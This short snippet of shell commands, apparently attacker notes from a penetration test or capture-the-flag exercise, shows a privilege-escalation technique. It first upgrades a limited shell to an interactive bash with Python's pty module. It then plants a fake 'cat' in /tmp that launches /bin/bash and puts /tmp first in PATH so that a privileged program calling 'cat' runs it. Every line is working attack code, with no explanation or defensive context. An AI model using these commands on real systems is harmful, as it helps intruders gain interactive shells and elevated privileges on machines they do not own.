python -c "import pty;pty.spawn('/bin/bash');"

echo "/bin/bash" > /tmp/cat
chmod +x /tmp/cat
echo $PATH
export PATH=/tmp:$PATH
